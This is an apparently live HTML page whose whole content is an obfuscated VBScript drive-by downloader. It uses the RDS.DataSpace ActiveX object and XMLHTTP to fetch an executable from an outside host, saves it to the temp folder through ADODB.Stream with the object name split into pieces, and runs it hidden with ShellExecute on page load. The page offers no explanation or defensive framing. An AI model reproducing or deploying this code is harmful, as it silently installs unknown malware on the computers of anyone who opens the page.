<script language="VBScript">
  on error resume next
  xx="object"
  xxx="classid"
  xxxx="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
  xxxxx="Microsoft.XMLHTTP"
  xxxxxx="GET"
  xxxxxxx="Scripting.FileSystemObject"
  xxxxxxxx="Shell.Application"
  dl = "http://www.tesing.com/shop/1.exe"
  Set df = document.createElement(xx)
  df.setAttribute xxx, xxxx
  str=xxxxx
  Set x = df.CreateObject(str,"")
  a1="Ado"
  a2="db."
  a3="Str"
  a4="eam"
  str1=a1&a2&a3&a4
  str5=str1
  set S = df.createobject(str5,"")
  S.type = 1
  str6=xxxxxx
  x.Open str6, dl, False
  x.Send
  fname1="007.com"
  set F = df.createobject(xxxxxxx,"")
  set tmp = F.GetSpecialFolder(2) 
  fname1= F.BuildPath(tmp,fname1)
  S.open
  S.write x.responseBody
  S.savetofile fname1,2
  S.close
  set Q = df.createobject(xxxxxxxx,"")
  Q.ShellExecute fname1,"","","open",0
  </script>
 <title></title>
  </head><body>
      
  </body></html>





</body>
</html>

